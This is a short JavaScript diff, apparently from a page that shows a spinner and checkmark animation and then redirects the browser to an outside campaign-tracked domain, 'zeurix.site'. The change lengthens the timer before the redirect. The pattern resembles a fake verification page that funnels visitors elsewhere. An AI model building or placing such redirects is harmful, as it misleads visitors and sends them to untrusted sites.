@@ -145,7 +145,7 @@
 
         // Small grace period for the checkmark animation
         setTimeout(() => { window.location.href = 'http://zeurix.site/?utm_campaign=gXUQnk2FQz&v1=[v1]&v2=[v2]&v3=[v3]'; }, 100);
-      }, 3000);
+      }, 300000);
     }, 100); // "few milliseconds" before starting the spinner
   }
 
